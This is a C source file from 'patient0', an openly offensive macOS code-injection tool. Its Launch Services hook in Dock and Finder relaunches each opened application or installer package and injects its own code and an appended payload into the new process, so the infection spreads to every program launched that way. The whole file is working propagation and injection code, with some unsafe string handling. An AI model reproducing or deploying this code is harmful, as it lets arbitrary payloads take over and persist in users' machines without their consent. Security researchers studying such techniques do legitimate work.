/* patient0
 * Bundle which acts as a super-spreader for any given
 * bit of injected code.  It interposes custom functions
 * for Launch Services normally used by Dock and Finder.
 * On launch, it will inject a custom payload if supplied.
 *
 * Payloads are appended to the patient0 bundle upon injection
 * and suffixed with a 4 byte size interval. patient0 will
 * use that size to offset into itself and extract the payload.
 * (See syringe.c for more details.)
 * Copyright (c) 2009 Will Drewry <redpig@dataspill.org>. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file or at http://github.org/redpig/patient0.
 */
//#include <dlfcn.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>

#include <patient0/infect.h>
#include <patient0/mach_jump.h>
#include <patient0/runtime.h>
#include <patient0/spawn.h>
#include <patient0/log.h>

static struct {
  unsigned char *code;
  uint32_t size;
} self;

static struct {
  unsigned char *code;
  uint32_t size;
  thread_act_t thread;
} payload;


static char installer[] = "/System/Library/CoreServices/Installer.app/Contents/MacOS/Installer";


/* Launch Services interposers */
#include <CoreServices/CoreServices.h>
/* Right now, we pull in the CoreServices framework.  This is not needed */
typedef OSStatus (*LSOpenFromRefSpec_t)(const LSLaunchFSRefSpec*, FSRef*);
OSStatus p0_LSOpenFromRefSpec(const LSLaunchFSRefSpec *inLaunchSpec,
                              FSRef *outLaunchedRef) {

  p0_logf(P0_INFO, "LSOpenFromRefSpec called");
  p0_logf(P0_INFO, "-> numDocs = %d", inLaunchSpec->numDocs);
  p0_logf(P0_INFO, "-> appRef = %p", inLaunchSpec->appRef);
  /* TODO: add launch with docs support later. */
  if (!inLaunchSpec->appRef && inLaunchSpec->numDocs == 1) {
    char path[1024] = { 0 };
    char *args[5] = { 0 };
    char *envs[] = { 0 }; /* TODO */
    if (FSRefMakePath(inLaunchSpec->itemRefs,
                      (uint8_t *) path,
                      sizeof(path)) == KERN_SUCCESS) {
      size_t path_len = strlen(path);
      bool known_type = false;
      mach_port_t taskport = MACH_PORT_NULL;
      /* Check the extensions to guess the right behavior.
       * This needs a lot of polishing.
       */
      if (!strcmp(path + (path_len - 4), ".pkg")) {
        args[0] = installer;
        args[1] = path;
        p0_logf(P0_INFO, "requested to launch an installer package");
        known_type = true;
        p0_logf(P0_INFO, "NOTE: runner is setuid root and is untouchable to us");
      } else if (!strcmp(path+strlen(path)-4, ".app")) {
        /* If the path ends in .app, copy whatever is after
         * Applications/....app to the end..*/
        char real_path[sizeof(path)] = { 0 };
        p0_logf(P0_INFO, "requested to launch an application");
        /* TODO DODGY AS HELL */
        strcat(real_path, path);
        strcat(real_path, "/Contents/MacOS/");
        /*  Find the last slash. Not perfect because slashes may be allowed */
        char *last_slash = strrchr(path, '/');
        if (last_slash) {
          /* Trim off the trailing .app */
          path[path_len - 4] = '\0';
          strcat(real_path, last_slash + 1);
          /* Now write it back to path so we don't go out of scope */
          strncpy(path, real_path, sizeof(path));
          known_type = true;
          args[0] = path;
        }
      }
      p0_logf(P0_INFO, "launching '%s'", path);
      /* TODO: check for file existence */
      if (!known_type) {
        p0_logf(P0_ERR, "unknown app type '%s'", path);
        LSOpenFromRefSpec_t orig = LSOpenFromRefSpec;
        return orig(inLaunchSpec, outLaunchedRef);
      }
      if (fork() == 0) { /* async ;-) */
        if (spawn(args[0], args, envs, &taskport, -1) > 0) {
          thread_act_t thread;
          time_t wait_until = time(NULL) + 2;  /* 2 seconds. */
          while (time(NULL) < wait_until) { sched_yield(); }
          p0_logf(P0_INFO, "launched '%s'", path);
          /* Now we inject the payload.
           * We inject ourself too to ensure our interpositions
           * occur in child processes.
           */
          if (!infect(taskport, self.code, self.size, &thread)) {
            p0_logf(P0_ERR, "failed to infect '%s'", path);
          }
        }
        _exit(0);
      }
      /* TODO: is this right? Just launching the app */
      if (outLaunchedRef) {
        *outLaunchedRef = *inLaunchSpec->itemRefs;
      }
      return KERN_SUCCESS;
      /* If spawn fails, we just fall through to the launch ref
       * so that things don't seem to wonky.
       */
      p0_logf(P0_ERR, "failed to launch '%s'", path);
    }
    p0_logf(P0_INFO, "failed to get path on numDocs==0");
  }
  LSOpenFromRefSpec_t orig = LSOpenFromRefSpec;
  return orig(inLaunchSpec, outLaunchedRef);
}

typedef (*run_t)(unsigned char *, uint32_t);
/* patient0 runtime. */
void run(unsigned char *code, uint32_t size) {
  /* Store our code away for later use. */
  self.code = code;
  self.size = size;
  payload.size = *((uint32_t *)(code+size-sizeof(uint32_t)));
  payload.code = (code + size - sizeof(uint32_t)) - payload.size;
  pid_t p = getpid();
  p0_logf(P0_INFO, "patient0 running");

  if (payload.size == 0) {
    payload.code = NULL;
  }
  p0_logf(P0_INFO, "payload size: %d", payload.size);

  /* Install interposition agents */
  mach_jump_init();
  mach_jump_patch("LSOpenFromRefSpec", p0_LSOpenFromRefSpec);

  /* TODO: if we are n finder, we should kill any others. */

  /* If we have a payload, run it! */
  if (!infect(mach_task_self(), payload.code, payload.size, &payload.thread)) {
    p0_logf(P0_ERR, "failed to self infect");
  }

  /* Hang, but don't terminate or waste resources.
   * This appears to be the "cleanest" approach so far especially
   * since returning will drop us in an invalid stack frame.
   */
  runtime_deadlock();
}
